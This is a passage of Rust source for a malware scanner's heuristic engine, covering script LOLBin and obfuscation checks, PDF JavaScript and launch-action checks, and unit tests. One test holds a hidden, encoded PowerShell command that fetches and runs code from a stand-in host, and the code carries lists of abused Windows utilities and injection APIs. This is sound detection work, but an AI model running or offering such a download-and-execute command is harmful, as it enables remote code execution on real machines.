    }

    let lolbin = contains_any(
        &lower,
        &["mshta", "regsvr32", "rundll32", "certutil", "bitsadmin"],
    );
    if lolbin && (network_fetch || has_encoded_command) {
        push_evidence(
            evidence,
            "script.lolbin_delivery",
            EvidenceSeverity::High,
            28,
            "script combines a commonly abused signed utility with remote or encoded content"
                .to_owned(),
        );
    }

    let obfuscation_characters = text
        .chars()
        .filter(|character| matches!(character, '`' | '^'))
        .count();
    if obfuscation_characters >= 16 && (expression_execution || has_encoded_command) {
        push_evidence(
            evidence,
            "script.token_obfuscation",
            EvidenceSeverity::Low,
            10,
            format!(
                "script has {obfuscation_characters} escape characters around executable content"
            ),
        );
    }

    if contains_any(&lower, &["[char[]]", "[char]", "-join"]) && expression_execution {
        push_evidence(
            evidence,
            "script.constructed_expression",
            EvidenceSeverity::Medium,
            18,
            "script constructs character data before dynamic execution".to_owned(),
        );
    }
}

fn analyze_pdf(bytes: &[u8], evidence: &mut Vec<Evidence>) {
    let javascript = contains_pdf_name(bytes, b"JavaScript") || contains_pdf_name(bytes, b"JS");
    let automatic_action =
        contains_pdf_name(bytes, b"OpenAction") || contains_pdf_name(bytes, b"AA");
    if javascript && automatic_action {
        push_evidence(
            evidence,
            "pdf.automatic_javascript",
            EvidenceSeverity::High,
            60,
            "PDF combines JavaScript with an automatic document action".to_owned(),
        );
    } else if javascript {
        push_evidence(
            evidence,
            "pdf.javascript",
            EvidenceSeverity::Low,
            15,
            "PDF declares JavaScript content".to_owned(),
        );
    }
    if contains_pdf_name(bytes, b"Launch") {
        push_evidence(
            evidence,
            "pdf.launch_action",
            EvidenceSeverity::High,
            55,
            "PDF contains an external-program launch action".to_owned(),
        );
    }
    if contains_pdf_name(bytes, b"EmbeddedFile") && contains_pdf_name(bytes, b"Filespec") {
        push_evidence(
            evidence,
            "pdf.embedded_file",
            EvidenceSeverity::Low,
            10,
            "PDF contains an embedded file object".to_owned(),
        );
    }
}

fn contains_pdf_name(bytes: &[u8], name: &[u8]) -> bool {
    let token_length = name.len().saturating_add(1);
    bytes
        .windows(token_length)
        .enumerate()
        .any(|(offset, token)| {
            token.first() == Some(&b'/')
                && token[1..]
                    .iter()
                    .zip(name)
                    .all(|(left, right)| left.eq_ignore_ascii_case(right))
                && bytes
                    .get(offset + token_length)
                    .is_none_or(|next| next.is_ascii_whitespace() || b"()<>[]{}/%".contains(next))
        })
}

fn contains_long_base64_token(text: &str, minimum_length: usize) -> bool {
    text.split(|character: char| {
        !character.is_ascii_alphanumeric()
            && character != '+'
            && character != '/'
            && character != '='
    })
    .any(|token| {
        token.len() >= minimum_length
            && token.len() % 4 == 0
            && token
                .bytes()
                .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'='))
    })
}

fn contains_any(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| haystack.contains(needle))
}

fn push_evidence(
    evidence: &mut Vec<Evidence>,
    code: &'static str,
    severity: EvidenceSeverity,
    risk_points: u8,
    description: String,
) {
    evidence.push(Evidence {
        code,
        severity,
        risk_points,
        description,
    });
}

fn verdict_confidence(
    verdict: Verdict,
    heuristic_score: u8,
    suspicious_threshold: u8,
    truncated: bool,
    evidence: &[Evidence],
) -> u8 {
    match verdict {
        Verdict::Malicious => 100,
        Verdict::Suspicious => {
            let corroboration = evidence
                .iter()
                .filter(|item| item.risk_points > 0)
                .count()
                .saturating_sub(1) as u8;
            70u8.saturating_add(corroboration.saturating_mul(5))
                .saturating_add(heuristic_score.saturating_sub(suspicious_threshold) / 5)
                .min(95)
        }
        Verdict::Clean if truncated => 30,
        Verdict::Clean => 75,
        Verdict::Error => 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{self, Cursor};

    #[test]
    fn harmless_self_test_is_an_exact_malicious_match() {
        let report = ScanEngine::default().scan_bytes(crate::self_test::PAYLOAD);
        assert_eq!(report.sha256.as_deref(), Some(BLACKSHARD_SELF_TEST_SHA256));
        assert_eq!(report.verdict, Verdict::Malicious);
        assert_eq!(report.risk_score, 100);
        assert_eq!(report.confidence, 100);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "signature.exact_sha256"));
    }

    #[test]
    fn exact_signature_database_accepts_uppercase_hex() {
        let mut signatures = SignatureDatabase::empty();
        signatures
            .insert_sha256_hex(
                &BLACKSHARD_SELF_TEST_SHA256.to_ascii_uppercase(),
                "test",
                None,
            )
            .unwrap();
        assert_eq!(signatures.len(), 1);
        let engine = ScanEngine::new(ScanConfig::default(), signatures).unwrap();
        assert_eq!(
            engine.scan_bytes(crate::self_test::PAYLOAD).verdict,
            Verdict::Malicious
        );
    }

    #[test]
    fn compact_signatures_use_prefix_buckets_and_exact_labels_override() {
        let first = [0x00; 32];
        let middle = [0x7a; 32];
        let last = [0xff; 32];
        let mut signatures = SignatureDatabase::empty();
        signatures
            .replace_compact_sha256(vec![first, middle, last], "MalwareBazaar.Historical", None)
            .unwrap();
        assert_eq!(
            signatures.lookup(&middle).map(|value| value.name.as_str()),
            Some("MalwareBazaar.Historical")
        );
        assert!(signatures.lookup(&[0x7b; 32]).is_none());

        signatures
            .insert_sha256_hex(&hex_sha256(&middle), "MalwareBazaar.Labelled", None)
            .unwrap();
        assert_eq!(
            signatures.lookup(&middle).map(|value| value.name.as_str()),
            Some("MalwareBazaar.Labelled")
        );
        assert!(signatures
            .replace_compact_sha256(vec![last, first], "invalid", None)
            .is_err());
    }

    #[test]
    fn compact_corpus_handles_malwarebazaar_scale() {
        const COUNT: usize = 1_200_000;
        let mut digests = Vec::with_capacity(COUNT);
        for index in 0..COUNT {
            let scaled = ((index as u128) * (u64::MAX as u128) / (COUNT as u128)) as u64;
            let mut digest = [0u8; 32];
            digest[..8].copy_from_slice(&scaled.to_be_bytes());
            digests.push(digest);
        }
        let probes = (0..10_000)
            .map(|index| digests[(index * 997) % COUNT])
            .collect::<Vec<_>>();
        let mut signatures = SignatureDatabase::empty();
        signatures
            .replace_compact_sha256(digests, "MalwareBazaar.Historical", None)
            .unwrap();
        assert_eq!(signatures.len(), COUNT);

        let started = std::time::Instant::now();
        for probe in probes {
            assert!(signatures.lookup(&probe).is_some());
            let mut miss = probe;
            miss[31] = 1;
            assert!(signatures.lookup(&miss).is_none());
        }
        eprintln!(
            "20,000 compact lookups across {COUNT} hashes completed in {:?}",
            started.elapsed()
        );
    }

    #[test]
    fn invalid_signature_digest_is_rejected() {
        let mut signatures = SignatureDatabase::empty();
        let error = signatures
            .insert_sha256_hex("not-a-digest", "bad", None)
            .unwrap_err();
        assert!(error.to_string().contains("64 hexadecimal"));
    }

    #[test]
    fn entropy_alone_never_escalates_to_suspicious_or_malicious() {
        let mut bytes = deterministic_high_entropy(256 * 1024);
        bytes[0] = 0;
        bytes[1] = 1;
        let report = ScanEngine::default().scan_bytes(&bytes);
        assert!(report.entropy >= HIGH_ENTROPY_THRESHOLD);
        assert_eq!(report.verdict, Verdict::Clean);
        assert_eq!(report.risk_score, 0);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "entropy.high_uncontextualized"));
    }

    #[test]
    fn benign_powershell_is_clean_and_content_classified() {
        let script = b"param($Name)\r\nWrite-Output \"Hello $Name\"\r\n";
        let report = ScanEngine::default().scan_bytes(script);
        assert_eq!(
            report.content_type,
            ContentType::Script(ScriptLanguage::PowerShell)
        );
        assert_eq!(report.verdict, Verdict::Clean);
        assert_eq!(report.risk_score, 0);
    }

    #[test]
    fn utf16_powershell_is_detected_by_content() {
        let text = "\u{feff}param($Name)\r\nWrite-Output $Name";
        let bytes: Vec<u8> = text.encode_utf16().flat_map(u16::to_le_bytes).collect();
        let report = ScanEngine::default().scan_bytes(&bytes);
        assert_eq!(
            report.content_type,
            ContentType::Script(ScriptLanguage::PowerShell)
        );
        assert_eq!(report.verdict, Verdict::Clean);
    }

    #[test]
    fn multi_signal_obfuscated_downloader_is_suspicious_not_malicious() {
        let encoded = "A".repeat(200);
        let script = format!(
            "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded}; IEX((New-Object Net.WebClient).DownloadString('https://example.invalid/a'))"
        );
        let report = ScanEngine::default().scan_bytes(script.as_bytes());
        assert_eq!(
            report.content_type,
            ContentType::Script(ScriptLanguage::PowerShell)
        );
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert_ne!(report.verdict, Verdict::Malicious);
        assert!(report.risk_score >= DEFAULT_SUSPICIOUS_THRESHOLD);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "script.download_and_execute"));
    }

    #[test]
    fn magic_numbers_are_classified_without_extensions() {
        let engine = ScanEngine::default();
        assert_eq!(
            engine.scan_bytes(b"%PDF-1.7\n").content_type,
            ContentType::Pdf
        );
        assert_eq!(
            engine.scan_bytes(b"PK\x03\x04data").content_type,
            ContentType::Zip
        );
        assert_eq!(
            engine.scan_bytes(b"\x7fELFdata").content_type,
            ContentType::Elf
        );
        assert_eq!(engine.scan_bytes(&[]).content_type, ContentType::Empty);
    }

    #[test]
    fn valid_minimal_pe_is_classified_and_not_convicted() {
        let pe = minimal_pe(false, false, ".text");
        let report = ScanEngine::default().scan_bytes(&pe);
        assert_eq!(report.content_type, ContentType::Pe64);
        assert_ne!(report.verdict, Verdict::Malicious);
    }

    #[test]
    fn corroborated_packer_style_pe_is_suspicious_not_malicious() {
        let pe = minimal_pe(true, true, "UPX0");
        let report = ScanEngine::default().scan_bytes(&pe);
        assert_eq!(report.content_type, ContentType::Pe64);
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert_ne!(report.verdict, Verdict::Malicious);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "pe.writable_executable_section"));
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "pe.packer_section_name"));
    }

    #[test]
    fn process_injection_import_cluster_is_high_risk() {
        let imports = [
            "virtualallocex".to_owned(),
            "writeprocessmemory".to_owned(),
            "createremotethread".to_owned(),
        ]
        .into_iter()
        .collect();
        let mut evidence = Vec::new();
        analyze_import_set(&imports, &mut evidence);
        let signal = evidence
            .iter()
            .find(|item| item.code == "pe.process_injection_capability")
            .expect("complete injection cluster should be reported");
        assert_eq!(signal.risk_points, 38);
        assert_eq!(signal.severity, EvidenceSeverity::High);
    }

    #[test]
    fn a_single_dual_use_import_does_not_create_an_injection_signal() {
        let imports = ["virtualallocex".to_owned()].into_iter().collect();
        let mut evidence = Vec::new();
        analyze_import_set(&imports, &mut evidence);
        assert!(!evidence
            .iter()
            .any(|item| item.code == "pe.process_injection_capability"));
    }

    #[test]
    fn a_large_pe_is_not_malformed_because_only_its_start_was_read() {
        let pe = minimal_pe(false, false, ".text");
        let engine = ScanEngine::default();
        // The section's raw data ends at 0x1200; only the first 0x800 bytes were read.
        let report = engine.scan_sample_with_digest(&pe[..0x800], pe.len() as u64, [0; 32]);
        assert_eq!(report.content_type, ContentType::Pe64);
        assert!(!report
            .evidence
            .iter()
            .any(|item| item.code == "pe.invalid_section_bounds"));
        assert_ne!(report.verdict, Verdict::Suspicious);

        // A section that runs past the end of the whole file is still malformed.
        let mut lying = minimal_pe(false, false, ".text");
        let section = 0x84 + 20 + 0xf0;
        lying[section + 16..section + 20].copy_from_slice(&0x4000u32.to_le_bytes());
        let report = engine.scan_bytes(&lying);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "pe.invalid_section_bounds"));
    }

    #[test]
    fn legacy_and_odd_but_sound_images_are_not_called_malformed() {
        let engine = ScanEngine::default();

        let mut ne = vec![0u8; 0x200];
        ne[0..2].copy_from_slice(b"MZ");
        ne[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
        ne[0x80..0x82].copy_from_slice(b"NE");
        let report = engine.scan_bytes(&ne);
        assert_eq!(report.verdict, Verdict::Clean);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "pe.legacy_executable"));

        // Sound headers, but the optional header is too short for goblin to read the image.
        let mut odd = minimal_pe(false, false, ".text");
        odd[0x84 + 16..0x84 + 18].copy_from_slice(&100u16.to_le_bytes());
        let report = engine.scan_bytes(&odd);
        assert_ne!(report.verdict, Verdict::Malicious);
        assert!(!report
            .evidence
            .iter()
            .any(|item| item.code == "pe.malformed"));
    }

    #[test]
    fn malformed_pe_is_suspicious_but_not_malicious() {
        let report = ScanEngine::default().scan_bytes(b"MZ definitely not a PE image");
        assert_eq!(report.content_type, ContentType::PeUnknown);
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert_ne!(report.verdict, Verdict::Malicious);
    }

    #[test]
    fn reader_is_strictly_bounded_and_whole_file_hash_is_omitted() {
        let config = ScanConfig {
            max_read_bytes: 1024,
            max_script_sample_bytes: 512,
            suspicious_threshold: DEFAULT_SUSPICIOUS_THRESHOLD,
        };
        let engine = ScanEngine::new(config, SignatureDatabase::default()).unwrap();
        let report = engine.scan_reader(Cursor::new(vec![b'A'; 4096]), Some(4096));
        assert_eq!(report.bytes_scanned, 1024);
        assert_eq!(report.file_size, 4096);
        assert!(report.truncated);
        assert!(report.sha256.is_none());
        assert_eq!(report.confidence, 30);
    }

    #[test]
    fn supplied_sample_preserves_declared_size_and_truncation() {
        let payload = crate::self_test::PAYLOAD;
        let engine = ScanEngine::default();
        let complete = engine.scan_sample(payload, payload.len() as u64);
        assert_eq!(complete.verdict, Verdict::Malicious);
        assert!(!complete.truncated);

        let partial = engine.scan_sample(payload, payload.len() as u64 + 1);
        assert_eq!(partial.verdict, Verdict::Clean);
        assert!(partial.truncated);
        assert!(partial.sha256.is_none());
        assert_eq!(partial.bytes_scanned, payload.len());
    }

    #[test]
    fn unknown_length_reader_detects_truncation_with_one_probe_byte() {
        let config = ScanConfig {
            max_read_bytes: 16,
            max_script_sample_bytes: 16,
            suspicious_threshold: DEFAULT_SUSPICIOUS_THRESHOLD,
        };
        let engine = ScanEngine::new(config, SignatureDatabase::empty()).unwrap();
        let report = engine.scan_reader(Cursor::new(vec![0u8; 17]), None);
        assert!(report.truncated);
        assert_eq!(report.bytes_scanned, 16);
        assert_eq!(report.file_size, 17);
    }

    #[test]
    fn reader_errors_have_an_explicit_error_verdict() {
        struct BrokenReader;
        impl Read for BrokenReader {
            fn read(&mut self, _buffer: &mut [u8]) -> io::Result<usize> {
                Err(io::Error::other("synthetic failure"))
            }
        }
        let report = ScanEngine::default().scan_reader(BrokenReader, Some(123));
        assert_eq!(report.verdict, Verdict::Error);
        assert_eq!(report.file_size, 123);
        assert!(report
            .error
            .as_deref()
            .unwrap()
            .contains("synthetic failure"));
    }

    #[test]
    fn config_rejects_unbounded_or_zero_limits() {
        let invalid = ScanConfig {
            max_read_bytes: 0,
            ..ScanConfig::default()
        };
        assert!(invalid.validate().is_err());
        let invalid = ScanConfig {
            suspicious_threshold: 0,
            ..ScanConfig::default()
        };
        assert!(invalid.validate().is_err());
    }

    #[test]
    fn automatic_pdf_javascript_is_suspicious() {
        let pdf = b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JavaScript (alert) >> endobj";
        let report = ScanEngine::default().scan_bytes(pdf);
        assert_eq!(report.content_type, ContentType::Pdf);
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert!(report
            .evidence
            .iter()
            .any(|item| item.code == "pdf.automatic_javascript"));
    }

    #[test]
    fn ordinary_pdf_header_is_not_escalated() {
        let report = ScanEngine::default().scan_bytes(b"%PDF-1.7\nordinary text");
        assert_eq!(report.verdict, Verdict::Clean);
    }

    #[test]
    fn pdf_name_prefixes_do_not_create_active_content_signals() {
        let report =
            ScanEngine::default().scan_bytes(b"%PDF-1.7\n<< /OpenActionable true /JSON (data) >>");
        assert_eq!(report.verdict, Verdict::Clean);
        assert!(report
            .evidence
            .iter()
            .all(|item| !item.code.starts_with("pdf.")));
    }

    fn deterministic_high_entropy(length: usize) -> Vec<u8> {
        let mut state = 0x5a17_c9e3_2d4b_8f01u64;
        let mut output = vec![0u8; length];
        for chunk in output.chunks_mut(8) {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            let generated = state.to_le_bytes();
            chunk.copy_from_slice(&generated[..chunk.len()]);
        }
        output
    }

    fn minimal_pe(writable_executable: bool, high_entropy: bool, section_name: &str) -> Vec<u8> {
        let mut bytes = vec![0u8; 0x1200];
        bytes[0..2].copy_from_slice(b"MZ");
        bytes[0x3c..0x40].copy_from_slice(&(0x80u32).to_le_bytes());
        bytes[0x80..0x84].copy_from_slice(b"PE\0\0");

        let coff = 0x84;
        bytes[coff..coff + 2].copy_from_slice(&0x8664u16.to_le_bytes());
        bytes[coff + 2..coff + 4].copy_from_slice(&1u16.to_le_bytes());
        bytes[coff + 16..coff + 18].copy_from_slice(&0xf0u16.to_le_bytes());
        bytes[coff + 18..coff + 20].copy_from_slice(&0x0022u16.to_le_bytes());

        let optional = coff + 20;
        bytes[optional..optional + 2].copy_from_slice(&0x20bu16.to_le_bytes());
        bytes[optional + 16..optional + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 20..optional + 24].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 24..optional + 32]
            .copy_from_slice(&0x0000_0001_4000_0000u64.to_le_bytes());
        bytes[optional + 32..optional + 36].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[optional + 36..optional + 40].copy_from_slice(&0x200u32.to_le_bytes());
        bytes[optional + 56..optional + 60].copy_from_slice(&0x2000u32.to_le_bytes());
        bytes[optional + 60..optional + 64].copy_from_slice(&0x200u32.to_le_bytes());
        bytes[optional + 68..optional + 70].copy_from_slice(&3u16.to_le_bytes());
        bytes[optional + 108..optional + 112].copy_from_slice(&16u32.to_le_bytes());

        let section = optional + 0xf0;
        let section_name = section_name.as_bytes();
        bytes[section..section + section_name.len().min(8)]
            .copy_from_slice(&section_name[..section_name.len().min(8)]);
        bytes[section + 8..section + 12].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 12..section + 16].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 16..section + 20].copy_from_slice(&0x1000u32.to_le_bytes());
        bytes[section + 20..section + 24].copy_from_slice(&0x200u32.to_le_bytes());
        let characteristics = if writable_executable {
            0xe000_0020u32
        } else {
            0x6000_0020u32
        };
        bytes[section + 36..section + 40].copy_from_slice(&characteristics.to_le_bytes());

        if high_entropy {
            let entropy = deterministic_high_entropy(0x1000);
            bytes[0x200..0x1200].copy_from_slice(&entropy);
        } else {
            bytes[0x200] = 0xc3;
        }
        bytes
    }
}
